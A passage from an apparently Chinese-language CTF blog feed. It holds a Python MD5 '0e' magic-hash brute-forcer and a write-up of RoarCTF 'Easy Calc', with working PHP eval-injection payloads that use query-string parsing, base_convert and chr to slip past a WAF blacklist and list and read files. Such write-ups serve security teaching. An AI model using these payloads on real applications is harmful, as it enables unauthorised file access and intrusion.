class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> str<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> str<span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> str<span class="token punctuation">:</span>                <span class="token keyword">for</span> n <span class="token keyword">in</span> str<span class="token punctuation">:</span>                    <span class="token keyword">for</span> k <span class="token keyword">in</span> str<span class="token punctuation">:</span>                        payload <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                        str1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>                        test1 <span class="token operator">=</span> str1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> test1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"0e"</span> <span class="token operator">and</span> test1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}->{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>test1<span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> str<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> str<span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> str<span class="token punctuation">:</span>                <span class="token keyword">for</span> n <span class="token keyword">in</span> str<span class="token punctuation">:</span>                    <span class="token keyword">for</span> k <span class="token keyword">in</span> str<span class="token punctuation">:</span>                        payload <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                        str1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>                        test2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> test2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"e"</span> <span class="token operator">and</span> test2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}->{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>test2<span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">return</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    a<span class="token punctuation">(</span><span class="token punctuation">)</span>    b<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>得到的两个结果：</p><p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p><p>于是构造payload：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png" alt="" loading="lazy"></p><p>发包得到flag</p><h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png" alt="" loading="lazy"></p><p>查看源代码后发现存在<code>calc.php</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png" alt="" loading="lazy"></p><p>访问得到后台源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p><blockquote><p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p></blockquote><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6654#toc-1" target="_blank" rel="noopener">从一道题到协议层攻击之HTTP请求走私</a></li><li><a href="https://blog.csdn.net/yankai0219/article/details/8269922" target="_blank" rel="noopener">http协议中content-length 以及chunked编码分析</a></li><li><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></li></ul><h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><pre class=" language-shell"><code class="language-shell">num=var_dump(base_convert(61693386291,10,36)(chr(47)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png" alt="" loading="lazy"></p><pre class=" language-shell"><code class="language-shell">num=var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png" alt="" loading="lazy"></p><h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p><blockquote><ul><li>删除初始空格</li><li>将某些字符转换为下划线（包括空格）</li></ul></blockquote><pre class=" language-shell"><code class="language-shell">? num=1;var_dump(scandir(chr(47)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png" alt="" loading="lazy"></p><pre class=" language-shell"><code class="language-shell">? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;其它&quot;&gt;&lt;a href=&quot;#其它&quot; class=&quot;headerlink&quot; title=&quot;其它&quot;&gt;&lt;/a&gt;其它&lt;/h1&gt;&lt;h2 id=&quot;百度杯九月场Code&quot;&gt;&lt;a href=&quot;#百度杯九月场Code&quot; class=&quot;headerlink&quot; title=&quot;百度杯九月场Code&quot;&gt;&lt;/a&gt;百度杯九月场Code&lt;/h2&gt;&lt;p&gt;界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;url：&lt;code&gt;http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg&lt;/code&gt;，查看源码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
  </entry>
  
</feed>
